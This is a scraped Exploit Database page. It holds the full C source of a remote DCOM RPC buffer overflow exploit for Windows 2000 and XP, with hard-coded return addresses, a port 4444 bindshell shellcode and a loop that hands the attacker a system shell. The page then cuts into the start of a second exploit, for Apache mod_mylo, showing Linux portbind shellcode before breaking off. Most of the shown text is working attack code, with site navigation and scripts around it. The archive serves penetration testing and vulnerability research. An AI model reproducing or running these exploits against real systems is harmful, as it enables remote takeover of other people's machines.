courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*DCOM RPC Overflow Discovered by LSD - Exploit Based on Xfocus's CodeWritten by H D Moore <hdm [at] metasploit.com>- Usage: ./dcom <Target ID> <Target IP>- Targets:-          0    Windows 2000 SP0 (english)-          1    Windows 2000 SP1 (english)-          2    Windows 2000 SP2 (english)-          3    Windows 2000 SP3 (english)-          4    Windows 2000 SP4 (english)-          5    Windows XP SP0 (english)-          6    Windows XP SP1 (english)*/#include <stdio.h>#include <stdlib.h>#include <error.h>#include <sys/types.h>#include <sys/socket.h>#include <netinet/in.h>#include <arpa/inet.h>#include <unistd.h>#include <netdb.h>#include <fcntl.h>#include <unistd.h>unsigned char bindstr[]={0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};unsigned char request1[]={0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0xE8,0x03,0x00,0x00,0xE5,0x00,0x00,0x00,0xD0,0x03,0x00,0x00,0x01,0x00,0x04,0x00,0x05,0x00,0x06,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x32,0x24,0x58,0xFD,0xCC,0x45,0x64,0x49,0xB0,0x70,0xDD,0xAE,0x74,0x2C,0x96,0xD2,0x60,0x5E,0x0D,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x5E,0x0D,0x00,0x02,0x00,0x00,0x00,0x7C,0x5E,0x0D,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x80,0x96,0xF1,0xF1,0x2A,0x4D,0xCE,0x11,0xA6,0x6A,0x00,0x20,0xAF,0x6E,0x72,0xF4,0x0C,0x00,0x00,0x00,0x4D,0x41,0x52,0x42,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0xA8,0xF4,0x0B,0x00,0x60,0x03,0x00,0x00,0x60,0x03,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xA2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x03,0x00,0x00,0x28,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0xC8,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x28,0x03,0x00,0x00,0xD8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xC4,0x28,0xCD,0x00,0x64,0x29,0xCD,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0xB9,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAB,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA5,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA6,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA4,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAD,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAA,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x07,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x58,0x00,0x00,0x00,0x90,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x78,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x50,0x00,0x00,0x00,0x4F,0xB6,0x88,0x20,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x48,0x00,0x00,0x00,0x07,0x00,0x66,0x00,0x06,0x09,0x02,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x78,0x19,0x0C,0x00,0x58,0x00,0x00,0x00,0x05,0x00,0x06,0x00,0x01,0x00,0x00,0x00,0x70,0xD8,0x98,0x93,0x98,0x4F,0xD2,0x11,0xA9,0x3D,0xBE,0x57,0xB2,0x00,0x00,0x00,0x32,0x00,0x31,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x80,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x18,0x43,0x14,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xC0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x3B,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x81,0xC5,0x17,0x03,0x80,0x0E,0xE9,0x4A,0x99,0x99,0xF1,0x8A,0x50,0x6F,0x7A,0x85,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x30,0x00,0x00,0x00,0x78,0x00,0x6E,0x00,0x00,0x00,0x00,0x00,0xD8,0xDA,0x0D,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x2F,0x0C,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x46,0x00,0x58,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x10,0x00,0x00,0x00,0x30,0x00,0x2E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x68,0x00,0x00,0x00,0x0E,0x00,0xFF,0xFF,0x68,0x8B,0x0B,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};unsigned char request2[]={0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x5C,0x00,0x5C,0x00};unsigned char request3[]={0x5C,0x00,0x43,0x00,0x24,0x00,0x5C,0x00,0x31,0x00,0x32,0x00,0x33,0x00,0x34,0x00,0x35,0x00,0x36,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x2E,0x00,0x64,0x00,0x6F,0x00,0x63,0x00,0x00,0x00};unsigned char *targets [] ={"Windows 2000 SP0 (english)","Windows 2000 SP1 (english)","Windows 2000 SP2 (english)","Windows 2000 SP3 (english)","Windows 2000 SP4 (english)","Windows XP SP0 (english)","Windows XP SP1 (english)",NULL};unsigned long offsets [] ={0x77e81674,0x77e829ec,0x77e824b5,0x77e8367a,0x77f92a9b,0x77e9afe3,0x77e626ba,};unsigned char sc[]="\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00""\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00""\x46\x00\x58\x00\x46\x00\x58\x00""\xff\xff\xff\xff" /* return address */"\xcc\xe0\xfd\x7f" /* primary thread data block */"\xcc\xe0\xfd\x7f" /* primary thread data block *//* port 4444 bindshell */"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x90\x90\x90\x90\x90\x90\x90\xeb\x19\x5e\x31\xc9\x81\xe9\x89\xff""\xff\xff\x81\x36\x80\xbf\x32\x94\x81\xee\xfc\xff\xff\xff\xe2\xf2""\xeb\x05\xe8\xe2\xff\xff\xff\x03\x53\x06\x1f\x74\x57\x75\x95\x80""\xbf\xbb\x92\x7f\x89\x5a\x1a\xce\xb1\xde\x7c\xe1\xbe\x32\x94\x09""\xf9\x3a\x6b\xb6\xd7\x9f\x4d\x85\x71\xda\xc6\x81\xbf\x32\x1d\xc6""\xb3\x5a\xf8\xec\xbf\x32\xfc\xb3\x8d\x1c\xf0\xe8\xc8\x41\xa6\xdf""\xeb\xcd\xc2\x88\x36\x74\x90\x7f\x89\x5a\xe6\x7e\x0c\x24\x7c\xad""\xbe\x32\x94\x09\xf9\x22\x6b\xb6\xd7\x4c\x4c\x62\xcc\xda\x8a\x81""\xbf\x32\x1d\xc6\xab\xcd\xe2\x84\xd7\xf9\x79\x7c\x84\xda\x9a\x81""\xbf\x32\x1d\xc6\xa7\xcd\xe2\x84\xd7\xeb\x9d\x75\x12\xda\x6a\x80""\xbf\x32\x1d\xc6\xa3\xcd\xe2\x84\xd7\x96\x8e\xf0\x78\xda\x7a\x80""\xbf\x32\x1d\xc6\x9f\xcd\xe2\x84\xd7\x96\x39\xae\x56\xda\x4a\x80""\xbf\x32\x1d\xc6\x9b\xcd\xe2\x84\xd7\xd7\xdd\x06\xf6\xda\x5a\x80""\xbf\x32\x1d\xc6\x97\xcd\xe2\x84\xd7\xd5\xed\x46\xc6\xda\x2a\x80""\xbf\x32\x1d\xc6\x93\x01\x6b\x01\x53\xa2\x95\x80\xbf\x66\xfc\x81""\xbe\x32\x94\x7f\xe9\x2a\xc4\xd0\xef\x62\xd4\xd0\xff\x62\x6b\xd6""\xa3\xb9\x4c\xd7\xe8\x5a\x96\x80\xae\x6e\x1f\x4c\xd5\x24\xc5\xd3""\x40\x64\xb4\xd7\xec\xcd\xc2\xa4\xe8\x63\xc7\x7f\xe9\x1a\x1f\x50""\xd7\x57\xec\xe5\xbf\x5a\xf7\xed\xdb\x1c\x1d\xe6\x8f\xb1\x78\xd4""\x32\x0e\xb0\xb3\x7f\x01\x5d\x03\x7e\x27\x3f\x62\x42\xf4\xd0\xa4""\xaf\x76\x6a\xc4\x9b\x0f\x1d\xd4\x9b\x7a\x1d\xd4\x9b\x7e\x1d\xd4""\x9b\x62\x19\xc4\x9b\x22\xc0\xd0\xee\x63\xc5\xea\xbe\x63\xc5\x7f""\xc9\x02\xc5\x7f\xe9\x22\x1f\x4c\xd5\xcd\x6b\xb1\x40\x64\x98\x0b""\x77\x65\x6b\xd6\x93\xcd\xc2\x94\xea\x64\xf0\x21\x8f\x32\x94\x80""\x3a\xf2\xec\x8c\x34\x72\x98\x0b\xcf\x2e\x39\x0b\xd7\x3a\x7f\x89""\x34\x72\xa0\x0b\x17\x8a\x94\x80\xbf\xb9\x51\xde\xe2\xf0\x90\x80""\xec\x67\xc2\xd7\x34\x5e\xb0\x98\x34\x77\xa8\x0b\xeb\x37\xec\x83""\x6a\xb9\xde\x98\x34\x68\xb4\x83\x62\xd1\xa6\xc9\x34\x06\x1f\x83""\x4a\x01\x6b\x7c\x8c\xf2\x38\xba\x7b\x46\x93\x41\x70\x3f\x97\x78""\x54\xc0\xaf\xfc\x9b\x26\xe1\x61\x34\x68\xb0\x83\x62\x54\x1f\x8c""\xf4\xb9\xce\x9c\xbc\xef\x1f\x84\x34\x31\x51\x6b\xbd\x01\x54\x0b""\x6a\x6d\xca\xdd\xe4\xf0\x90\x80\x2f\xa2\x04";unsigned char request4[]={0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x20,0x00,0x00,0x00,0x30,0x00,0x2D,0x00,0x00,0x00,0x00,0x00,0x88,0x2A,0x0C,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x28,0x8C,0x0C,0x00,0x01,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00};/* ripped from TESO code */void shell (int sock){int     l;char    buf[512];fd_set  rfds;while (1) {FD_SET (0, &rfds);FD_SET (sock, &rfds);select (sock + 1, &rfds, NULL, NULL, NULL);if (FD_ISSET (0, &rfds)) {l = read (0, buf, sizeof (buf));if (l <= 0) {printf("\n - Connection closed by local user\n");exit (EXIT_FAILURE);}write (sock, buf, l);}if (FD_ISSET (sock, &rfds)) {l = read (sock, buf, sizeof (buf));if (l == 0) {printf ("\n - Connection closed by remote host.\n");exit (EXIT_FAILURE);} else if (l < 0) {printf ("\n - Read failure\n");exit (EXIT_FAILURE);}write (1, buf, l);}}}int main(int argc, char **argv){int sock;int len,len1;unsigned int target_id;unsigned long ret;struct sockaddr_in target_ip;unsigned short port = 135;unsigned char buf1[0x1000];unsigned char buf2[0x1000];printf("---------------------------------------------------------\n");printf("- Remote DCOM RPC Buffer Overflow Exploit\n");printf("- Original code by FlashSky and Benjurry\n");printf("- Rewritten by HDM <hdm [at] metasploit.com>\n");if(argc<3){printf("- Usage: %s <Target ID> <Target IP>\n", argv[0]);printf("- Targets:\n");for (len=0; targets[len] != NULL; len++){printf("-          %d\t%s\n", len, targets[len]);}printf("\n");exit(1);}/* yeah, get over it :) */target_id = atoi(argv[1]);ret = offsets[target_id];printf("- Using return address of 0x%.8x\n", ret);memcpy(sc+36, (unsigned char *) &ret, 4);target_ip.sin_family = AF_INET;target_ip.sin_addr.s_addr = inet_addr(argv[2]);target_ip.sin_port = htons(port);if ((sock=socket(AF_INET,SOCK_STREAM,0)) == -1){perror("- Socket");return(0);}if(connect(sock,(struct sockaddr *)&target_ip, sizeof(target_ip)) != 0){perror("- Connect");return(0);}len=sizeof(sc);memcpy(buf2,request1,sizeof(request1));len1=sizeof(request1);*(unsigned long *)(request2)=*(unsigned long *)(request2)+sizeof(sc)/2;*(unsigned long *)(request2+8)=*(unsigned long *)(request2+8)+sizeof(sc)/2;memcpy(buf2+len1,request2,sizeof(request2));len1=len1+sizeof(request2);memcpy(buf2+len1,sc,sizeof(sc));len1=len1+sizeof(sc);memcpy(buf2+len1,request3,sizeof(request3));len1=len1+sizeof(request3);memcpy(buf2+len1,request4,sizeof(request4));len1=len1+sizeof(request4);*(unsigned long *)(buf2+8)=*(unsigned long *)(buf2+8)+sizeof(sc)-0xc;*(unsigned long *)(buf2+0x10)=*(unsigned long *)(buf2+0x10)+sizeof(sc)-0xc;*(unsigned long *)(buf2+0x80)=*(unsigned long *)(buf2+0x80)+sizeof(sc)-0xc;*(unsigned long *)(buf2+0x84)=*(unsigned long *)(buf2+0x84)+sizeof(sc)-0xc;*(unsigned long *)(buf2+0xb4)=*(unsigned long *)(buf2+0xb4)+sizeof(sc)-0xc;*(unsigned long *)(buf2+0xb8)=*(unsigned long *)(buf2+0xb8)+sizeof(sc)-0xc;*(unsigned long *)(buf2+0xd0)=*(unsigned long *)(buf2+0xd0)+sizeof(sc)-0xc;*(unsigned long *)(buf2+0x18c)=*(unsigned long *)(buf2+0x18c)+sizeof(sc)-0xc;if (send(sock,bindstr,sizeof(bindstr),0)== -1){perror("- Send");return(0);}len=recv(sock, buf1, 1000, 0);if (send(sock,buf2,len1,0)== -1){perror("- Send");return(0);}close(sock);sleep(1);target_ip.sin_family = AF_INET;target_ip.sin_addr.s_addr = inet_addr(argv[2]);target_ip.sin_port = htons(4444);if ((sock=socket(AF_INET,SOCK_STREAM,0)) == -1){perror("- Socket");return(0);}if(connect(sock,(struct sockaddr *)&target_ip, sizeof(target_ip)) != 0){printf("- Exploit appeared to have failed.\n");return(0);}printf("- Dropping to System Shell...\n\n");shell(sock);return(0);}// milw0rm.com [2003-07-26]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 67
Apache 1.3.x mod_mylo - Remote Code Execution - Multiple remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDApache 1.3.x mod_mylo - Remote Code ExecutionEDB-ID:67CVE:2003-0651EDB Verified:Author:Carl LivittType:remoteExploit:/Platform:MultipleDate:2003-07-28Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*Apache + mod_mylo remote exploitBy Carl Livitt / July 2003carllivitt at hush dot comPublic release - Linux and FreeBSD targets.*/#include <sys/types.h>#include <sys/stat.h>#include <sys/socket.h>#include <net/if.h>#include <netinet/in.h>#include <netinet/tcp.h>#include <arpa/inet.h>#include <stdio.h>#include <string.h>#include <unistd.h>#include <signal.h>#include <netdb.h>#include <time.h>#include <stdarg.h>#define SIZ 8096#define HTTP_PORT 80#define SHELL_PORT 45295#define SOCKET_ERR -2#define CONNECT_ERR -3#define HOST_NOT_RESOLVED -4#define BRUTE_FORCE_EXHAUSTED -5#define SHELL_NOT_FOUND -7#define SUCCESS 1#define FAILED 0// The following shellcode had 0x3f (?) chars in it which// cause termination of our HTTP GET before the whole// shellcode is written to the stack. The 0x3f's are// needed because they are the dup2() syscall numbers. So,// I've changed them to 0x3e's and INC'd them before doing// an INT 0x80. Other than that, this shellcode is eSDee's.// --------// linux x86 shellcode by eSDee of Netric (www.netric.org)// 200 byte - forking portbind shellcode - port=0xb0ef(45295)char linux_shellcode[]="\x31\xc0\x31\xdb\x31\xc9\x51\xb1""\x06\x51\xb1\x01\x51\xb1\x02\x51""\x89\xe1\xb3\x01\xb0\x66\xcd\x80""\x89\xc1\x31\xc0\x31\xdb\x50\x50""\x50\x66\x68\xb0\xef\xb3\x02\x66""\x53\x89\xe2\xb3\x10\x53\xb3\x02""\x52\x51\x89\xca\x89\xe1\xb0\x66""\xcd\x80\x31\xdb\x39\xc3\x74\x05""\x31\xc0\x40\xcd\x80\x31\xc0\x50""\x52\x89\xe1\xb3\x04\xb0\x66\xcd""\x80\x89\xd7\x31\xc0\x31\xdb\x31""\xc9\xb3\x11\xb1\x01\xb0\x30\xcd""\x80\x31\xc0\x31\xdb\x50\x50\x57""\x89\xe1\xb3\x05\xb0\x66\xcd\x80""\x89\xc6\x31\xc0\x31\xdb\xb0\x02""\xcd\x80\x39\xc3\x75\x40\x31\xc0""\x89\xfb\xb0\x06\xcd\x80\x31\xc0""\x31\xc9\x89\xf3\xb0\x3e\xfe\xc0\xcd\x80""\x31\xc0\x41\xb0\x3e\xfe\xc0\xcd\x80\x31""\xc0\x41\xb0\x3e\xfe\xc0\xcd\x80\x31\xc0""\x50\x68\x2f\x2f\x73\x68\x68\x2f""\x62\x69\x6e\x89\xe3\x8b\x54\x24""\x08\x50\x53\x89\xe1\xb0\x0b\xcd""\x80\x31\xc0\x40\xcd\x80\x31\xc0""\x89\xf3\xb0\x06\xcd\x80\xeb\x99";// This shellcode is unchanged (why reinvent the wheel ?):// --------/* BSD x86 shellcode by eSDee of Netric (www.netric.org)* 194 byte 